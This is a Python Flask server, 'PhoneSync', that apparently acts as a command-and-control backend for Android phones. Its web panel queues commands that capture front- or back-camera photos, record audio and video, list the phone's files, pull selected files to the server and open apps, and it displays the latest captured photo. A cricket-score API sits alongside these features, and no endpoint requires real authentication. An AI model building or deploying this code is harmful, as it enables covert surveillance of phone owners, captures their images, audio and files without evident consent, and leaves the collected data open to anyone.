import os
import json
import sqlite3
import html
from datetime import datetime
from pathlib import Path

import requests
from flask import Flask, jsonify, request, send_from_directory, render_template_string, url_for

app = Flask(__name__)

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"
DB_PATH = BASE_DIR / "database.db"
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

MAX_UPLOAD_SIZE = 500 * 1024 * 1024


# ============================================================
# DATABASE
# ============================================================

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def table_columns(conn, table_name):
    rows = conn.execute(f"PRAGMA table_info({table_name})").fetchall()
    return {row[1] for row in rows}


def add_column_if_missing(conn, table_name, column_name, definition):
    if column_name not in table_columns(conn, table_name):
        conn.execute(
            f"ALTER TABLE {table_name} ADD COLUMN {column_name} {definition}"
        )


def init_db():
    conn = get_db()

    conn.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT NOT NULL,
            target_device_id TEXT,
            created_at TEXT NOT NULL
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            device_name TEXT,
            device_info TEXT,
            created_at TEXT NOT NULL,
            last_seen TEXT
        )
    """)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS mobile_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            path TEXT NOT NULL,
            name TEXT,
            size INTEGER DEFAULT 0,
            modified TEXT,
            device_name TEXT,
            device_id TEXT,
            created_at TEXT NOT NULL
        )
    """)

    # Migrate existing PhoneSync databases without deleting old data.
    add_column_if_missing(conn, "commands", "target_device_id", "TEXT")
    add_column_if_missing(conn, "devices", "device_id", "TEXT")
    add_column_if_missing(conn, "devices", "last_seen", "TEXT")
    add_column_if_missing(conn, "mobile_files", "device_id", "TEXT")

    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_commands_target
        ON commands(target_device_id, id)
    """)

    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_devices_device_id
        ON devices(device_id)
    """)

    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_mobile_files_device
        ON mobile_files(device_id, name)
    """)

    conn.commit()
    conn.close()


init_db()


# ============================================================
# HELPERS
# ============================================================

def now():
    return datetime.utcnow().isoformat(timespec="seconds")


def save_command(command, target_device_id=None):
    conn = get_db()
    cursor = conn.execute(
        """
        INSERT INTO commands
        (command, target_device_id, created_at)
        VALUES (?, ?, ?)
        """,
        (command, target_device_id or None, now())
    )
    conn.commit()
    command_id = cursor.lastrowid
    conn.close()
    return command_id


def get_devices():
    conn = get_db()
    rows = conn.execute("""
        SELECT id, device_id, device_name, device_info,
               created_at, last_seen
        FROM devices
        WHERE device_id IS NOT NULL
          AND device_id != ''
        ORDER BY device_name COLLATE NOCASE, id
    """).fetchall()
    conn.close()
    return rows


def get_device(device_id):
    if not device_id:
        return None
    conn = get_db()
    row = conn.execute(
        """
        SELECT id, device_id, device_name, device_info,
               created_at, last_seen
        FROM devices
        WHERE device_id = ?
        LIMIT 1
        """,
        (device_id,)
    ).fetchone()
    conn.close()
    return row


def touch_device(device_id):
    if not device_id:
        return
    conn = get_db()
    conn.execute(
        "UPDATE devices SET last_seen = ? WHERE device_id = ?",
        (now(), device_id)
    )
    conn.commit()
    conn.close()


def device_is_known(device_id):
    return get_device(device_id) is not None


def command_is_valid(command):
    return bool(command and len(command) <= 20000)


# ============================================================
# BASIC ROUTES
# ============================================================

@app.route("/")
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhoneSync Server</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: Arial, sans-serif; background:#f5f7fb; margin:0; padding:30px; color:#111827; }
            .box { max-width:760px; margin:auto; background:white; padding:30px; border-radius:18px; box-shadow:0 10px 30px rgba(0,0,0,.08); }
            a { display:block; margin:12px 0; color:#2563eb; text-decoration:none; font-weight:600; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>PhoneSync Server</h1>
            <p>Server is running successfully.</p>
            <a href="/health">Health</a>
            <a href="/control">Phone Control</a>
            <a href="/devices">Registered Devices</a>
            <a href="/files">Uploaded Files</a>
            <a href="/mobile_files_view">Phone File List</a>
        </div>
    </body>
    </html>
    """


@app.route("/health")
def health():
    rows = get_devices()
    return jsonify({
        "status": "ok",
        "service": "PhoneSync Server",
        "devices": len(rows),
        "time": now()
    })


# ============================================================
# DEVICE REGISTRATION
# ============================================================

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json(silent=True) or {}

    device_id = str(data.get("device_id", "")).strip()
    device_name = str(data.get("device_name", "Android Device")).strip()

    if not device_id:
        return jsonify({
            "success": False,
            "error": "Missing device_id"
        }), 400

    if not device_name:
        device_name = "Android Device"

    device_info = json.dumps(data, ensure_ascii=False)
    timestamp = now()

    conn = get_db()

    existing = conn.execute(
        "SELECT id FROM devices WHERE device_id = ? LIMIT 1",
        (device_id,)
    ).fetchone()

    if existing:
        conn.execute(
            """
            UPDATE devices
            SET device_name = ?,
                device_info = ?,
                last_seen = ?
            WHERE device_id = ?
            """,
            (device_name, device_info, timestamp, device_id)
        )
        action = "updated"
    else:
        conn.execute(
            """
            INSERT INTO devices
            (device_id, device_name, device_info, created_at, last_seen)
            VALUES (?, ?, ?, ?, ?)
            """,
            (device_id, device_name, device_info, timestamp, timestamp)
        )
        action = "registered"

    conn.commit()
    conn.close()

    return jsonify({
        "success": True,
        "message": f"Device {action}",
        "device_id": device_id,
        "device_name": device_name
    })


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(silent=True) or {}
    device_id = str(data.get("device_id", "")).strip()

    if device_id:
        touch_device(device_id)

    return jsonify({
        "success": True,
        "message": "Login accepted",
        "device_id": device_id,
        "device_name": data.get("device_name", "Android Device")
    })


@app.route("/api/devices", methods=["GET"])
def api_devices():
    rows = get_devices()

    result = []
    for row in rows:
        result.append({
            "id": row["id"],
            "device_id": row["device_id"],
            "device_name": row["device_name"] or "Android Device",
            "created_at": row["created_at"],
            "last_seen": row["last_seen"]
        })

    return jsonify({
        "success": True,
        "devices": result
    })


@app.route("/devices", methods=["GET"])
def devices_page():
    rows = get_devices()

    html_rows = ""
    for row in rows:
        html_rows += f"""
        <tr>
            <td>{html.escape(row['device_name'] or 'Android Device')}</td>
            <td><code>{html.escape(row['device_id'] or '')}</code></td>
            <td>{html.escape(row['last_seen'] or 'Never')}</td>
            <td>{html.escape(row['created_at'] or '')}</td>
        </tr>
        """

    if not html_rows:
        html_rows = '<tr><td colspan="4">No devices registered yet.</td></tr>'

    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhoneSync Devices</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family:Arial,sans-serif; background:#f5f7fb; padding:20px; }
            .box { max-width:1200px; margin:auto; background:white; padding:25px; border-radius:18px; box-shadow:0 8px 25px rgba(0,0,0,.08); overflow-x:auto; }
            table { width:100%; border-collapse:collapse; }
            th,td { padding:11px; border-bottom:1px solid #ddd; text-align:left; }
            th { background:#f1f5f9; }
            code { word-break:break-all; }
            a { color:#2563eb; text-decoration:none; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>Registered Devices</h1>
            <table>
                <tr>
                    <th>Device</th>
                    <th>Device ID</th>
                    <th>Last Seen</th>
                    <th>Registered</th>
                </tr>
                {{ rows|safe }}
            </table>
            <p><a href="/control">← Control Panel</a></p>
        </div>
    </body>
    </html>
    """, rows=html_rows)


# ============================================================
# COMMAND SYSTEM
# ============================================================

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}

    command = str(data.get("command", "")).strip()
    target_device_id = str(data.get("device_id", "")).strip()

    if not command_is_valid(command):
        return jsonify({
            "success": False,
            "error": "Missing or invalid command"
        }), 400

    if not target_device_id:
        return jsonify({
            "success": False,
            "error": "Missing device_id"
        }), 400

    if not device_is_known(target_device_id):
        return jsonify({
            "success": False,
            "error": "Device is not registered"
        }), 404

    command_id = save_command(
        command,
        target_device_id
    )

    return jsonify({
        "success": True,
        "id": command_id,
        "command": command,
        "device_id": target_device_id
    })


@app.route("/send_command_ui", methods=["POST"])
def send_command_ui():
    command = request.form.get("command", "").strip()
    target_device_id = request.form.get("device_id", "").strip()

    if not command_is_valid(command):
        return jsonify({
            "success": False,
            "error": "Missing or invalid command"
        }), 400

    if not target_device_id:
        return jsonify({
            "success": False,
            "error": "Select a device first"
        }), 400

    if not device_is_known(target_device_id):
        return jsonify({
            "success": False,
            "error": "Selected device is not registered"
        }), 404

    command_id = save_command(
        command,
        target_device_id
    )

    return jsonify({
        "success": True,
        "id": command_id,
        "command": command,
        "device_id": target_device_id
    })


@app.route("/get_command", methods=["GET"])
def get_command():
    device_id = request.args.get("device_id", "").strip()

    if not device_id:
        return jsonify({
            "command": "",
            "id": 0,
            "error": "device_id is required"
        }), 400

    touch_device(device_id)

    conn = get_db()

    row = conn.execute(
        """
        SELECT id, command, target_device_id, created_at
        FROM commands
        WHERE target_device_id = ?
        ORDER BY id DESC
        LIMIT 1
        """,
        (device_id,)
    ).fetchone()

    conn.close()

    if row is None:
        return jsonify({
            "command": "",
            "id": 0,
            "device_id": device_id
        })

    return jsonify({
        "command": row["command"],
        "id": row["id"],
        "device_id": row["target_device_id"],
        "created_at": row["created_at"]
    })


# ============================================================
# FILE UPLOAD FROM ANDROID
# ============================================================

@app.route("/upload", methods=["POST"])
def upload():
    if "file" not in request.files:
        return jsonify({
            "success": False,
            "error": "No file field received"
        }), 400

    uploaded_file = request.files["file"]

    if not uploaded_file.filename:
        return jsonify({
            "success": False,
            "error": "Empty filename"
        }), 400

    filename = Path(uploaded_file.filename).name
    destination = UPLOAD_DIR / filename

    if destination.exists():
        stem = destination.stem
        suffix = destination.suffix
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = f"{stem}_{timestamp}{suffix}"
        destination = UPLOAD_DIR / filename

    uploaded_file.save(destination)

    return jsonify({
        "success": True,
        "filename": filename,
        "size": destination.stat().st_size
    })


# ============================================================
# UPLOADED FILES
# ============================================================

@app.route("/files")
def files():
    images = []
    audio = []
    videos = []
    other = []

    for path in sorted(
        UPLOAD_DIR.iterdir(),
        key=lambda p: p.stat().st_mtime if p.exists() else 0,
        reverse=True
    ):
        if not path.is_file():
            continue

        name = path.name
        ext = path.suffix.lower()

        if ext in [".jpg", ".jpeg", ".png", ".webp", ".gif"]:
            images.append(name)
        elif ext in [".m4a", ".mp3", ".wav", ".aac", ".ogg", ".flac"]:
            audio.append(name)
        elif ext in [".mp4", ".mkv", ".avi", ".mov", ".webm"]:
            videos.append(name)
        else:
            other.append(name)

    def make_list(items, title):
        result = f"<h2>{title}</h2>"

        if not items:
            return result + "<p>No files.</p>"

        result += "<ul>"

        for filename in items:
            safe_name = html.escape(filename)
            safe_url = requests.utils.quote(filename, safe="")
            result += f"""
                <li style="margin:12px 0;">
                    <strong>{safe_name}</strong>
                    &nbsp;
                    <a href="/view/{safe_url}">View</a>
                    &nbsp;
                    <a href="/download/{safe_url}">Download</a>
                </li>
            """

        return result + "</ul>"

    body = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhoneSync Files</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family:Arial,sans-serif; background:#f5f7fb; padding:20px; }
            .box { max-width:900px; margin:auto; background:white; padding:25px; border-radius:18px; box-shadow:0 8px 25px rgba(0,0,0,.08); }
            a { color:#2563eb; text-decoration:none; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>PhoneSync Uploaded Files</h1>
    """

    body += make_list(images, "Images")
    body += make_list(videos, "Videos")
    body += make_list(audio, "Audio")
    body += make_list(other, "Other Files")

    body += """
            <p><a href="/">← Back</a></p>
        </div>
    </body>
    </html>
    """

    return body


@app.route("/view/<path:filename>")
def view_file(filename):
    return send_from_directory(
        UPLOAD_DIR,
        filename,
        as_attachment=False
    )


@app.route("/download/<path:filename>")
def download_file(filename):
    return send_from_directory(
        UPLOAD_DIR,
        filename,
        as_attachment=True
    )


# ============================================================
# PHONE FILE LIST
# ============================================================

@app.route("/filelist", methods=["POST"])
def receive_file_list():
    data = request.get_json(silent=True) or {}

    files_data = data.get("files", [])
    device_id = str(data.get("device_id", "")).strip()
    device_name = str(data.get("device_name", "Android Device")).strip()

    if not device_id:
        return jsonify({
            "success": False,
            "error": "Missing device_id"
        }), 400

    if not device_is_known(device_id):
        return jsonify({
            "success": False,
            "error": "Device is not registered"
        }), 404

    if not isinstance(files_data, list):
        return jsonify({
            "success": False,
            "error": "files must be a list"
        }), 400

    touch_device(device_id)

    conn = get_db()

    # Replace only this device's previous file list.
    conn.execute(
        "DELETE FROM mobile_files WHERE device_id = ?",
        (device_id,)
    )

    received = 0

    for item in files_data:
        if not isinstance(item, dict):
            continue

        path = str(item.get("path", ""))
        name = str(item.get("name", ""))

        try:
            size = int(item.get("size", 0) or 0)
        except (TypeError, ValueError):
            size = 0

        modified = str(item.get("modified", ""))

        conn.execute(
            """
            INSERT INTO mobile_files
            (path, name, size, modified, device_name, device_id, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                path,
                name,
                size,
                modified,
                device_name,
                device_id,
                now()
            )
        )
        received += 1

    conn.commit()
    conn.close()

    return jsonify({
        "success": True,
        "device_id": device_id,
        "received": received
    })


@app.route("/mobile_files", methods=["GET"])
def mobile_files():
    device_id = request.args.get("device_id", "").strip()

    conn = get_db()

    if device_id:
        rows = conn.execute(
            """
            SELECT id, path, name, size, modified,
                   device_name, device_id, created_at
            FROM mobile_files
            WHERE device_id = ?
            ORDER BY name COLLATE NOCASE
            """,
            (device_id,)
        ).fetchall()
    else:
        rows = conn.execute(
            """
            SELECT id, path, name, size, modified,
                   device_name, device_id, created_at
            FROM mobile_files
            ORDER BY device_name COLLATE NOCASE,
                     name COLLATE NOCASE
            """
        ).fetchall()

    conn.close()

    return jsonify([
        {
            "id": row["id"],
            "path": row["path"],
            "name": row["name"],
            "size": row["size"],
            "modified": row["modified"],
            "device_name": row["device_name"],
            "device_id": row["device_id"],
            "created_at": row["created_at"]
        }
        for row in rows
    ])


@app.route("/mobile_files_view", methods=["GET"])
def mobile_files_view():
    device_id = request.args.get("device_id", "").strip()

    conn = get_db()

    if device_id:
        rows = conn.execute(
            """
            SELECT id, path, name, size, modified,
                   device_name, device_id
            FROM mobile_files
            WHERE device_id = ?
            ORDER BY name COLLATE NOCASE
            """,
            (device_id,)
        ).fetchall()
    else:
        rows = conn.execute(
            """
            SELECT id, path, name, size, modified,
                   device_name, device_id
            FROM mobile_files
            ORDER BY device_name COLLATE NOCASE,
                     name COLLATE NOCASE
            """
        ).fetchall()

    conn.close()

    html_rows = ""

    for row in rows:
        html_rows += f"""
        <tr>
            <td>{html.escape(row['name'] or '')}</td>
            <td>{html.escape(row['path'] or '')}</td>
            <td>{row['size']}</td>
            <td>{html.escape(row['modified'] or '')}</td>
            <td>{html.escape(row['device_name'] or '')}</td>
        </tr>
        """

    if not html_rows:
        html_rows = '<tr><td colspan="5">No phone files received yet.</td></tr>'

    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phone Files</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family:Arial,sans-serif; background:#f5f7fb; padding:20px; }
            .box { max-width:1300px; margin:auto; background:white; padding:20px; border-radius:16px; overflow-x:auto; }
            table { width:100%; border-collapse:collapse; }
            th,td { text-align:left; padding:10px; border-bottom:1px solid #ddd; }
            th { background:#f1f5f9; }
            a { color:#2563eb; text-decoration:none; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>Phone Files</h1>
            <table>
                <tr>
                    <th>Name</th>
                    <th>Path</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Device</th>
                </tr>
                {{ rows|safe }}
            </table>
            <p><a href="/control">← Control Panel</a></p>
        </div>
    </body>
    </html>
    """, rows=html_rows)


# ============================================================
# REQUEST A PHONE FILE
# ============================================================

@app.route("/request_mobile_file", methods=["POST"])
def request_mobile_file():
    path = request.form.get("path", "").strip()
    device_id = request.form.get("device_id", "").strip()

    if not path:
        return jsonify({
            "success": False,
            "error": "Missing path"
        }), 400

    if not device_id:
        return jsonify({
            "success": False,
            "error": "Missing device_id"
        }), 400

    if not device_is_known(device_id):
        return jsonify({
            "success": False,
            "error": "Device is not registered"
        }), 404

    command_id = save_command(
        "request_file:" + path,
        device_id
    )

    return jsonify({
        "success": True,
        "id": command_id,
        "path": path,
        "device_id": device_id
    })


@app.route("/request_file", methods=["POST"])
def request_file_json():
    data = request.get_json(silent=True) or {}

    path = str(data.get("path", "")).strip()
    device_id = str(data.get("device_id", "")).strip()

    if not path:
        return jsonify({
            "success": False,
            "error": "Missing path"
        }), 400

    if not device_id:
        return jsonify({
            "success": False,
            "error": "Missing device_id"
        }), 400

    if not device_is_known(device_id):
        return jsonify({
            "success": False,
            "error": "Device is not registered"
        }), 404

    command_id = save_command(
        "request_file:" + path,
        device_id
    )

    return jsonify({
        "success": True,
        "id": command_id,
        "path": path,
        "device_id": device_id
    })


# Legacy endpoint retained for compatibility.
@app.route("/get_requested_file", methods=["GET"])
def get_requested_file():
    return jsonify({"path": ""})


# ============================================================
# CRICKET LIVE API
# ============================================================

@app.route("/api/live_matches", methods=["GET"])
def live_matches():
    api_key = os.getenv("CRICKET_API_KEY", "").strip()

    if not api_key:
        return jsonify({
            "success": False,
            "error": "CRICKET_API_KEY is not configured on the server",
            "data": []
        }), 500

    url = "https://api.cricapi.com/v1/currentMatches"

    try:
        response = requests.get(
            url,
            params={
                "apikey": api_key,
                "offset": 0
            },
            timeout=15
        )
        response.raise_for_status()
        return jsonify(response.json())

    except requests.RequestException as exc:
        return jsonify({
            "success": False,
            "error": f"Cricket API request failed: {exc}",
            "data": []
        }), 502

    except ValueError:
        return jsonify({
            "success": False,
            "error": "Cricket API returned invalid JSON",
            "data": []
        }), 502


# ============================================================
# LATEST PHOTO
# ============================================================

@app.route("/api/latest_photo")
def latest_photo_api():
    image_exts = {".jpg", ".jpeg", ".png", ".webp", ".gif"}

    photos = [
        p for p in UPLOAD_DIR.iterdir()
        if p.is_file() and p.suffix.lower() in image_exts
    ]

    if not photos:
        return jsonify({
            "success": True,
            "available": False
        })

    photo = max(
        photos,
        key=lambda p: p.stat().st_mtime
    )

    return jsonify({
        "success": True,
        "available": True,
        "filename": photo.name,
        "modified": photo.stat().st_mtime,
        "url": url_for(
            "view_file",
            filename=photo.name,
            _external=True
        ),
        "download_url": url_for(
            "download_file",
            filename=photo.name,
            _external=True
        )
    }), 200, {"Cache-Control": "no-store"}


# ============================================================
# CONTROL PANEL
# ============================================================

COMMANDS = [
    ("photo_request", "Take Photo"),
    ("start_audio", "Start Audio"),
    ("stop_audio", "Stop Audio"),
    ("start_video", "Start Video"),
    ("stop_video", "Stop Video"),
    ("get_files", "Get Phone Files"),
    ("open_chrome", "Open Chrome"),
    ("open_youtube", "Open YouTube"),
    ("open_whatsapp", "Open WhatsApp"),
    ("open_instagram", "Open Instagram"),
]


@app.route("/control", methods=["GET"])
def control():
    rows = get_devices()

    device_options = '<option value="">-- Select Device --</option>'

    for row in rows:
        device_id = html.escape(row["device_id"] or "", quote=True)
        device_name = html.escape(row["device_name"] or "Android Device")
        device_options += (
            f'<option value="{device_id}">{device_name}</option>'
        )

    buttons = ""

    for command, label in COMMANDS:
        buttons += (
            '<button class="cmd" '
            f'onclick="sendCommand(\\\'{command}\\\', this)">'
            f'{label}</button>'
        )

    html_page = """
    <!DOCTYPE html>
    <html>
    <head>
      <title>PhoneSync Control</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family:Arial,sans-serif; background:#f3f4f6; margin:0; padding:25px; color:#111827; }
        .box { max-width:1150px; margin:auto; background:white; padding:28px; border-radius:20px; box-shadow:0 10px 30px rgba(0,0,0,.08); }
        select { width:100%; max-width:650px; padding:13px; border:1px solid #cbd5e1; border-radius:10px; font-size:16px; background:white; }
        .selector { background:#f8fafc; padding:18px; border-radius:15px; margin-bottom:20px; }
        .cmd { border:0; border-radius:10px; padding:13px 17px; background:#111827; color:white; cursor:pointer; font-size:15px; margin:5px; }
        .cmd:hover { opacity:.85; }
        .cmd:disabled { opacity:.55; cursor:wait; }
        .small { border:0; border-radius:8px; padding:8px 12px; background:#2563eb; color:white; cursor:pointer; }
        .small:disabled { opacity:.5; }
        hr { margin:25px 0; border:0; border-top:1px solid #ddd; }
        .photo-box { min-height:250px; background:#f8fafc; border-radius:15px; padding:20px; text-align:center; }
        #latestPhoto { max-width:100%; max-height:500px; border-radius:12px; object-fit:contain; }
        table { width:100%; border-collapse:collapse; margin-top:15px; }
        th,td { padding:10px; border-bottom:1px solid #ddd; text-align:left; }
        th { background:#f1f5f9; }
        .links a { display:inline-block; margin-right:20px; margin-top:15px; color:#2563eb; text-decoration:none; }
        .status { margin-top:12px; font-weight:600; }
        .camera-row { margin-top:15px; }
        .hint { color:#64748b; font-size:14px; }
      </style>
    </head>
    <body>
      <div class="box">
        <h1>PhoneSync Control</h1>
        <p>Control your authorized Android devices.</p>

        <div class="selector">
          <h2>Select Device</h2>
          <select id="deviceSelect" onchange="deviceChanged()">
            __DEVICE_OPTIONS__
          </select>
          <p id="deviceStatus" class="hint">Select a registered device.</p>

          <div class="camera-row">
            <h2>Select Camera</h2>
            <select id="cameraSelect">
              <option value="back">Back Camera</option>
              <option value="front">Front Camera</option>
            </select>
          </div>
        </div>

        <div id="commandButtons">__BUTTONS__</div>
        <div id="commandStatus" class="status"></div>

        <hr>
        <h2>Latest Phone Photo</h2>
        <div class="photo-box">
          <div id="photoMessage">Select a device.</div>
          <img id="latestPhoto" style="display:none" alt="Latest phone photo">
          <p><a id="photoDownload" style="display:none" target="_blank">Download Photo</a></p>
        </div>

        <hr>
        <h2>Phone Files</h2>
        <div id="phoneFiles">Select a device.</div>

        <div class="links">
          <a href="/devices">Registered Devices</a>
          <a href="/files">Uploaded Files</a>
          <a href="/mobile_files_view">Phone Files Page</a>
          <a href="/api/live_matches">Live Cricket API</a>
          <a href="/">← Home</a>
        </div>
      </div>

      <script>
        let selectedDeviceId = '';

        function deviceChanged() {
          selectedDeviceId = document.getElementById('deviceSelect').value;
          const status = document.getElementById('deviceStatus');

          if (!selectedDeviceId) {
            status.textContent = 'Select a registered device.';
            document.getElementById('photoMessage').textContent = 'Select a device.';
            document.getElementById('phoneFiles').textContent = 'Select a device.';
            return;
          }

          status.textContent = 'Selected device.';
          refreshPhoto();
          refreshFiles();
        }

        function getSelectedDevice() {
          return document.getElementById('deviceSelect').value;
        }

        function getSelectedCamera() {
          return document.getElementById('cameraSelect').value;
        }

        async function sendCommand(command, button) {
          const deviceId = getSelectedDevice();

          if (!deviceId) {
            alert('Please select a device first.');
            return;
          }

          if (command === 'photo_request') {
            command = 'photo_request:' + getSelectedCamera();
          }

          const originalText = button.innerText;
          const status = document.getElementById('commandStatus');

          button.disabled = true;
          button.innerText = 'Sending...';
          status.textContent = '';

          try {
            const body = new URLSearchParams();
            body.append('command', command);
            body.append('device_id', deviceId);

            const response = await fetch('/send_command_ui', {
              method: 'POST',
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: body.toString()
            });

            const data = await response.json();

            if (!response.ok || !data.success) {
              throw new Error(data.error || ('Server HTTP ' + response.status));
            }

            status.textContent = 'Command sent to selected device: ' + command;

            if (command.startsWith('photo_request')) {
              button.innerText = 'Photo Requested';
              setTimeout(refreshPhoto, 3000);
              setTimeout(refreshPhoto, 6000);
              setTimeout(refreshPhoto, 10000);
            }

            if (command === 'get_files') {
              button.innerText = 'Scanning Phone...';
              setTimeout(refreshFiles, 3000);
              setTimeout(refreshFiles, 7000);
            }

          } catch (e) {
            console.error(e);
            status.textContent = 'Error: ' + e.message;
            alert('Command failed: ' + e.message);

          } finally {
            setTimeout(() => {
              button.disabled = false;
              button.innerText = originalText;
            }, 3000);
          }
        }

        async function refreshPhoto() {
          const deviceId = getSelectedDevice();
          if (!deviceId) return;

          try {
            const r = await fetch('/api/latest_photo?device_id=' + encodeURIComponent(deviceId) + '&ts=' + Date.now(), {cache:'no-store'});
            if (!r.ok) throw new Error('Photo API HTTP ' + r.status);

            const d = await r.json();
            const img = document.getElementById('latestPhoto');
            const msg = document.getElementById('photoMessage');
            const dl = document.getElementById('photoDownload');

            if (d.available) {
              img.src = d.url + '?ts=' + Date.now();
              img.style.display = 'inline-block';
              msg.style.display = 'none';
              dl.href = d.download_url;
              dl.style.display = 'inline';
            } else {
              img.style.display = 'none';
              dl.style.display = 'none';
              msg.textContent = 'No photo received from this device yet.';
              msg.style.display = 'block';
            }
          } catch (e) {
            console.error(e);
            document.getElementById('photoMessage').textContent = 'Unable to load photo.';
          }
        }

        function esc(v) {
          return String(v)
            .replaceAll('&','&amp;')
            .replaceAll('<','&lt;')
            .replaceAll('>','&gt;')
            .replaceAll('"','&quot;')
            .replaceAll("'",'&#039;');
        }

        async function refreshFiles() {
          const deviceId = getSelectedDevice();
          if (!deviceId) return;

          try {
            const r = await fetch('/mobile_files?device_id=' + encodeURIComponent(deviceId) + '&ts=' + Date.now(), {cache:'no-store'});
            if (!r.ok) throw new Error('File API HTTP ' + r.status);

            const d = await r.json();
            const files = Array.isArray(d) ? d : (d.files || []);
            const c = document.getElementById('phoneFiles');

            if (!files.length) {
              c.innerHTML = '<p>No phone files received yet. Click <b>Get Phone Files</b>.</p>';
              return;
            }

            let h = '<table><tr><th>Name</th><th>Path</th><th>Size</th><th>Action</th></tr>';

            for (const f of files) {
              const mb = (Number(f.size || 0) / 1048576).toFixed(2);
              h += '<tr><td>' + esc(f.name || '') + '</td><td>' + esc(f.path || '') + '</td><td>' + mb + ' MB</td>';
              h += '<td><button class="small" onclick="requestFile(this)" data-path="' + encodeURIComponent(f.path || '') + '">Download</button></td></tr>';
            }

            c.innerHTML = h + '</table>';

          } catch (e) {
            console.error(e);
            document.getElementById('phoneFiles').textContent = 'Unable to load phone files.';
          }
        }

        async function requestFile(btn) {
          const deviceId = getSelectedDevice();
          const path = decodeURIComponent(btn.dataset.path || '');

          if (!deviceId || !path) return;

          btn.disabled = true;
          btn.innerText = 'Requesting...';

          try {
            const body = new URLSearchParams();
            body.append('path', path);
            body.append('device_id', deviceId);

            const r = await fetch('/request_mobile_file', {
              method:'POST',
              headers:{'Content-Type':'application/x-www-form-urlencoded'},
              body:body.toString()
            });

            const d = await r.json();

            alert(d.success
              ? 'File request sent to the selected Android phone.'
              : (d.error || 'Request failed.'));

          } catch (e) {
            alert('File request failed: ' + e.message);

          } finally {
            btn.disabled = false;
            btn.innerText = 'Download';
          }
        }

        // Refresh registered device list periodically.
        async function refreshDevices() {
          try {
            const r = await fetch('/api/devices?ts=' + Date.now(), {cache:'no-store'});
            if (!r.ok) return;
            const d = await r.json();
            if (!d.success) return;

            const select = document.getElementById('deviceSelect');
            const current = select.value;

            select.innerHTML = '<option value="">-- Select Device --</option>';

            for (const device of d.devices) {
              const option = document.createElement('option');
              option.value = device.device_id;
              option.textContent = device.device_name || 'Android Device';
              select.appendChild(option);
            }

            if (d.devices.some(x => x.device_id === current)) {
              select.value = current;
            }

            selectedDeviceId = select.value;
          } catch (e) {
            console.error(e);
          }
        }

        setInterval(refreshDevices, 10000);
        setInterval(refreshPhoto, 5000);
        setInterval(refreshFiles, 7000);
      </script>
    </body>
    </html>
    """

    return (
        html_page
        .replace('__DEVICE_OPTIONS__', device_options)
        .replace('__BUTTONS__', buttons)
    )


# ============================================================
# ERROR HANDLERS
# ============================================================

@app.errorhandler(413)
def request_entity_too_large(error):
    return jsonify({
        "success": False,
        "error": "Uploaded file is too large"
    }), 413


# ============================================================
# SERVER CONFIG
# ============================================================

app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_SIZE


if __name__ == "__main__":
    port = int(os.getenv("PORT", "5000"))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
